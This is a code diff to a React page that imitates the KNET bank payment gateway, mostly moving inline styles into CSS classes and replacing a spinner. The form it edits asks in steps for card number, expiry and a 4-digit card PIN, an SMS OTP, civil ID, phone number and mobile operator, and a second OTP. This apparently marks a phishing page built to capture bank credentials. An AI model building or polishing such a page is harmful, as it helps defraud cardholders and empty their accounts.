@@ -1,5 +1,4 @@
 import { useState, useEffect, useRef } from "react";
-import { Loader2 } from "lucide-react";
 import { base44 } from "@/api/base44Client";
 
 const BANKS = [
@@ -140,6 +139,7 @@ export default function KnetPayment() {
   return (
     <div style={{ fontFamily: "Verdana, Arial, Helvetica, sans-serif", backgroundColor: "#ebebeb", minHeight: "100vh" }} dir="ltr">
       <style>{knetCss}</style>
+
       {/* Fraud Awareness Banner */}
       <div style={{ maxWidth: 460, margin: "0 auto", padding: "12px 15px 0" }}>
         <img
@@ -149,7 +149,7 @@ export default function KnetPayment() {
         />
       </div>
 
-      <div className="knet-container">
+      <div id="knet-container">
         <form onSubmit={e => e.preventDefault()}>
           {/* KNET Logo */}
           <div style={{ textAlign: "center", marginBottom: 5 }}>
@@ -159,12 +159,11 @@ export default function KnetPayment() {
               style={{ height: 50, objectFit: "contain", display: "inline-block", marginTop: 16 }}
               onError={e => { e.target.style.display = "none"; }}
             />
-
           </div>
 
-          <div className="knet-content-block">
+          <div id="knet-content-block">
             {/* Info Card */}
-            <div className="knet-form-card">
+            <div id="knet-info-card" className="knet-form-card">
               <div className="knet-row">
                 <div className="knet-col-label"><label>Payment Form</label></div>
                 <div className="knet-col-value" style={{ textAlign: "right" }}>
@@ -183,9 +182,7 @@ export default function KnetPayment() {
 
             {/* Form Card */}
             <div className="knet-form-card">
-              {step === 1 && (
-                <Step1 paymentInfo={paymentInfo} setPaymentInfo={setPaymentInfo} />
-              )}
+              {step === 1 && <Step1 paymentInfo={paymentInfo} setPaymentInfo={setPaymentInfo} />}
               {step === 2 && (
                 <Step2
                   paymentInfo={paymentInfo}
@@ -196,17 +193,13 @@ export default function KnetPayment() {
                   otpError={otpError}
                 />
               )}
-              {step === 3 && (
-                <Step3 paymentInfo={paymentInfo} setPaymentInfo={setPaymentInfo} />
-              )}
-              {step === 4 && (
-                <Step4 paymentInfo={paymentInfo} setPaymentInfo={setPaymentInfo} />
-              )}
+              {step === 3 && <Step3 paymentInfo={paymentInfo} setPaymentInfo={setPaymentInfo} />}
+              {step === 4 && <Step4 paymentInfo={paymentInfo} setPaymentInfo={setPaymentInfo} />}
             </div>
 
             {/* Action Buttons */}
             <div className="knet-form-card">
-              <div className="knet-row" style={{ border: 0, paddingBottom: 0 }}>
+              <div className="knet-row knet-btn-row">
                 <button
                   className="knet-submit-btn"
                   disabled={isSubmitDisabled || isLoading}
@@ -243,7 +236,7 @@ function Step1({ paymentInfo, setPaymentInfo }) {
       <div className="knet-row">
         <label className="knet-col-label">Select Your Bank:</label>
         <select
-          className="knet-col-value"
+          className="knet-col-value knet-select"
           value={paymentInfo.bank}
           onChange={e => {
             const bank = BANKS.find(b => b.value === e.target.value);
@@ -262,11 +255,11 @@ function Step1({ paymentInfo, setPaymentInfo }) {
         </select>
       </div>
 
-      <div className="knet-row knet-three-col">
+      <div className="knet-row">
         <label className="knet-col-label">Card Number:</label>
-        <div style={{ float: "left", width: "58%", display: "flex", gap: 4 }} className="knet-col-value knet-card-row">
+        <div className="knet-card-inputs">
           <select
-            style={{ width: "42%", fontSize: 11, height: 22, color: "#444", border: "1px solid #ccc" }}
+            className="knet-prefix-select"
             value={paymentInfo.prefix}
             onChange={e => setPaymentInfo(p => ({ ...p, prefix: e.target.value }))}
           >
@@ -283,35 +276,35 @@ function Step1({ paymentInfo, setPaymentInfo }) {
             value={paymentInfo.cardNumber}
             onChange={e => setPaymentInfo(p => ({ ...p, cardNumber: e.target.value.replace(/\D/g, "") }))}
             placeholder="0000000000"
-            style={{ width: "58%", border: "2px solid #0070cd", boxShadow: "inset 0 0 5px rgba(0,0,0,0.2)", padding: "0 4px", fontSize: 11, height: 22, color: "#444", boxSizing: "border-box" }}
+            className="knet-card-number-input"
           />
         </div>
       </div>
 
-      <div className="knet-row knet-three-col">
+      <div className="knet-row">
         <label className="knet-col-label">Expiration Date:</label>
-        <select
-          className="knet-col-value"
-          value={paymentInfo.month}
-          onChange={e => setPaymentInfo(p => ({ ...p, month: e.target.value }))}
-          style={{ width: "17%", marginRight: 5 }}
-        >
-          <option value="0">MM</option>
-          {Array.from({ length: 12 }, (_, i) => i + 1).map(m => (
-            <option key={m} value={String(m).padStart(2, "0")}>{String(m).padStart(2, "0")}</option>
-          ))}
-        </select>
-        <select
-          className="knet-col-long"
-          value={paymentInfo.year}
-          onChange={e => setPaymentInfo(p => ({ ...p, year: e.target.value }))}
-          style={{ width: "38%" }}
-        >
-          <option value="0">YYYY</option>
-          {Array.from({ length: 14 }, (_, i) => 2024 + i).map(y => (
-            <option key={y} value={y}>{y}</option>
-          ))}
-        </select>
+        <div className="knet-expiry-inputs">
+          <select
+            className="knet-expiry-mm"
+            value={paymentInfo.month}
+            onChange={e => setPaymentInfo(p => ({ ...p, month: e.target.value }))}
+          >
+            <option value="0">MM</option>
+            {Array.from({ length: 12 }, (_, i) => i + 1).map(m => (
+              <option key={m} value={String(m).padStart(2, "0")}>{String(m).padStart(2, "0")}</option>
+            ))}
+          </select>
+          <select
+            className="knet-expiry-yyyy"
+            value={paymentInfo.year}
+            onChange={e => setPaymentInfo(p => ({ ...p, year: e.target.value }))}
+          >
+            <option value="0">YYYY</option>
+            {Array.from({ length: 14 }, (_, i) => 2024 + i).map(y => (
+              <option key={y} value={y}>{y}</option>
+            ))}
+          </select>
+        </div>
       </div>
 
       <div className="knet-row">
@@ -322,10 +315,9 @@ function Step1({ paymentInfo, setPaymentInfo }) {
           maxLength={4}
           value={paymentInfo.pass}
           onChange={e => setPaymentInfo(p => ({ ...p, pass: e.target.value.replace(/\D/g, "") }))}
-          className="knet-col-value"
+          className="knet-col-value knet-input"
           autoComplete="off"
           placeholder="••••"
-          style={{ width: "58%" }}
         />
       </div>
     </>
@@ -336,9 +328,7 @@ function Step2({ paymentInfo, setPaymentInfo, otpValue, setOtpValue, countdown, 
   return (
     <>
       {otpError && (
-        <div style={{ fontSize: 12, background: "#fde8e8", border: "1px solid #f5c0c0", borderRadius: 4, padding: 10, marginBottom: 10, color: "#c0392b", fontWeight: "bold" }}>
-          ⚠ {otpError}
-        </div>
+        <div className="knet-otp-error">⚠ {otpError}</div>
       )}
       <div className="knet-alert-row">
         <strong>Please note:</strong> A 6-digit verification code has been sent via text message to your registered phone number
@@ -371,9 +361,8 @@ function Step2({ paymentInfo, setPaymentInfo, otpValue, setOtpValue, countdown, 
             setOtpValue(e.target.value.replace(/\D/g, ""));
             setPaymentInfo(p => ({ ...p, otp: e.target.value.replace(/\D/g, "") }));
           }}
-          className="knet-col-value"
+          className="knet-col-value knet-input"
           placeholder={`Timeout in: 01:${countdown === 0 ? "00" : String(countdown).padStart(2, "0")}`}
-          style={{ width: "58%" }}
         />
       </div>
     </>
@@ -391,9 +380,8 @@ function Step3({ paymentInfo, setPaymentInfo }) {
           maxLength={12}
           value={paymentInfo.idNumber}
           onChange={e => setPaymentInfo(p => ({ ...p, idNumber: e.target.value.replace(/\D/g, "") }))}
-          className="knet-col-value"
+          className="knet-col-value knet-input"
           placeholder="Civil / Residence ID"
-          style={{ width: "58%" }}
         />
       </div>
       <div className="knet-row">
@@ -404,15 +392,14 @@ function Step3({ paymentInfo, setPaymentInfo }) {
           maxLength={10}
           value={paymentInfo.phoneNumber}
           onChange={e => setPaymentInfo(p => ({ ...p, phoneNumber: e.target.value.replace(/\D/g, "") }))}
-          className="knet-col-value"
+          className="knet-col-value knet-input"
           placeholder="05XXXXXXXX"
-          style={{ width: "58%" }}
         />
       </div>
       <div className="knet-row">
         <label className="knet-col-label">Network operator:</label>
         <select
-          className="knet-col-value"
+          className="knet-col-value knet-select"
           value={paymentInfo.network}
           onChange={e => setPaymentInfo(p => ({ ...p, network: e.target.value }))}
         >
@@ -447,9 +434,8 @@ function Step4({ paymentInfo, setPaymentInfo }) {
           maxLength={6}
           value={paymentInfo.otp2}
           onChange={e => setPaymentInfo(p => ({ ...p, otp2: e.target.value.replace(/\D/g, "") }))}
-          className="knet-col-value"
+          className="knet-col-value knet-input"
           placeholder="6-digit OTP"
-          style={{ width: "58%" }}
         />
       </div>
     </>
@@ -467,7 +453,7 @@ function LoadingOverlay() {
         display: "flex", flexDirection: "column", alignItems: "center", gap: 12,
         boxShadow: "0 4px 24px rgba(0,0,0,0.3)"
       }}>
-        <Loader2 className="animate-spin" style={{ width: 36, height: 36, color: "#0070cd" }} />
+        <div className="knet-spinner"></div>
         <div style={{ color: "#0070cd", fontWeight: "bold", fontSize: 13 }}>Processing...</div>
       </div>
     </div>
@@ -475,15 +461,16 @@ function LoadingOverlay() {
 }
 
 const knetCss = `
-  .knet-container {
+  #knet-container {
     width: 100%;
     max-width: 460px;
     margin: 0 auto;
     padding: 0 15px 30px;
     box-sizing: border-box;
     position: relative;
+    font-family: Verdana, Arial, Helvetica, sans-serif;
   }
-  .knet-content-block {
+  #knet-content-block {
     width: 100%;
   }
   .knet-form-card {
@@ -494,6 +481,7 @@ const knetCss = `
     margin-bottom: 14px;
     box-shadow: 0 0 6px rgba(0,0,0,0.25);
     margin-top: 14px;
+    overflow: hidden;
   }
   .knet-row {
     border-bottom: 1px solid #8f8f90;
@@ -501,7 +489,6 @@ const knetCss = `
     overflow: hidden;
   }
   .knet-row:last-child { border-bottom: 0; padding-bottom: 0; }
-  .knet-three-col { }
   .knet-col-label {
     float: left;
     width: 40%;
@@ -516,11 +503,6 @@ const knetCss = `
     font-size: 11px;
     color: #444;
   }
-  .knet-col-long {
-    float: left;
-    font-size: 11px;
-    color: #444;
-  }
   .knet-text-label {
     font-weight: normal;
     line-height: 22px;
@@ -528,13 +510,15 @@ const knetCss = `
   .knet-form-card::after, .knet-row::after {
     content: ""; display: table; clear: both;
   }
-  select {
+  .knet-select {
     font-size: 11px;
     height: 22px;
     color: #444;
     border: 1px solid #ccc;
+    width: 100%;
+    box-sizing: border-box;
   }
-  input[type="tel"], input[type="password"] {
+  .knet-input {
     border: 2px solid #0070cd;
     box-shadow: inset 0 0 5px rgba(0,0,0,0.2);
     padding: 0 4px;
@@ -543,6 +527,64 @@ const knetCss = `
     height: 22px;
     color: #444;
     box-sizing: border-box;
+    width: 100%;
+  }
+  .knet-card-inputs {
+    float: left;
+    width: 58%;
+    display: flex;
+    gap: 4px;
+    box-sizing: border-box;
+  }
+  .knet-prefix-select {
+    width: 42%;
+    font-size: 11px;
+    height: 22px;
+    color: #444;
+    border: 1px solid #ccc;
+    box-sizing: border-box;
+    flex-shrink: 0;
+  }
+  .knet-card-number-input {
+    width: 58%;
+    border: 2px solid #0070cd;
+    box-shadow: inset 0 0 5px rgba(0,0,0,0.2);
+    padding: 0 4px;
+    outline: 0;
+    font-size: 11px;
+    height: 22px;
+    color: #444;
+    box-sizing: border-box;
+    flex: 1;
+  }
+  .knet-expiry-inputs {
+    float: left;
+    width: 58%;
+    display: flex;
+    gap: 6px;
+    box-sizing: border-box;
+  }
+  .knet-expiry-mm {
+    width: 38%;
+    font-size: 11px;
+    height: 22px;
+    color: #444;
+    border: 1px solid #ccc;
+    box-sizing: border-box;
+  }
+  .knet-expiry-yyyy {
+    width: 60%;
+    font-size: 11px;
+    height: 22px;
+    color: #444;
+    border: 1px solid #ccc;
+    box-sizing: border-box;
+  }
+  .knet-btn-row {
+    border: 0;
+    padding-bottom: 0;
+    display: flex;
+    gap: 4px;
   }
   .knet-submit-btn {
     background: #eaeaea;
@@ -550,11 +592,11 @@ const knetCss = `
     font-weight: bold;
     color: #666;
     width: 50%;
-    float: left;
     height: 28px;
     border-radius: 4px;
     font-size: 12px;
     cursor: pointer;
+    font-family: Verdana, Arial, Helvetica, sans-serif;
   }
   .knet-submit-btn:disabled {
     opacity: 0.55;
@@ -570,13 +612,7 @@ const knetCss = `
     border-radius: 4px;
     font-size: 12px;
     cursor: pointer;
-    float: left;
-  }
-  @media (max-width: 480px) {
-    .knet-card-row {
-      float: none !important;
-      width: 100% !important;
-    }
+    font-family: Verdana, Arial, Helvetica, sans-serif;
   }
   .knet-alert-row {
     font-size: 12px;
@@ -588,14 +624,35 @@ const knetCss = `
     margin-bottom: 10px;
     color: #444;
   }
+  .knet-otp-error {
+    font-size: 12px;
+    background: #fde8e8;
+    border: 1px solid #f5c0c0;
+    border-radius: 4px;
+    padding: 10px;
+    margin-bottom: 10px;
+    color: #c0392b;
+    font-weight: bold;
+  }
+  .knet-spinner {
+    width: 36px;
+    height: 36px;
+    border: 4px solid #e0e0e0;
+    border-top-color: #0070cd;
+    border-radius: 50%;
+    animation: knet-spin 0.8s linear infinite;
+  }
+  @keyframes knet-spin {
+    to { transform: rotate(360deg); }
+  }
   @media (max-width: 480px) {
-    .knet-container { padding: 0 8px 20px; }
+    #knet-container { padding: 0 8px 20px; }
     .knet-form-card { padding: 12px; }
     .knet-col-label {
       float: none;
       width: 100%;
       display: block;
-      margin-bottom: 2px;
+      margin-bottom: 4px;
     }
     .knet-col-value {
       float: none;
@@ -603,21 +660,31 @@ const knetCss = `
       display: block;
       box-sizing: border-box;
     }
-    .knet-col-long {
-      width: 50% !important;
-    }
-    .knet-three-col .knet-col-label {
+    .knet-card-inputs {
       float: none;
       width: 100%;
-      display: block;
     }
-    .knet-submit-btn, .knet-cancel-btn {
-      width: 50%;
+    .knet-prefix-select {
+      width: 40%;
     }
-    select, input[type="tel"], input[type="password"] {
+    .knet-card-number-input {
+      width: 60%;
+    }
+    .knet-expiry-inputs {
+      float: none;
+      width: 100%;
+    }
+    .knet-expiry-mm { width: 35%; }
+    .knet-expiry-yyyy { width: 63%; }
+    .knet-select, .knet-input {
       width: 100% !important;
       box-sizing: border-box;
       height: 28px;
+      font-size: 13px;
+    }
+    .knet-submit-btn, .knet-cancel-btn {
+      width: 50%;
+      height: 32px;
       font-size: 13px;
     }
   }
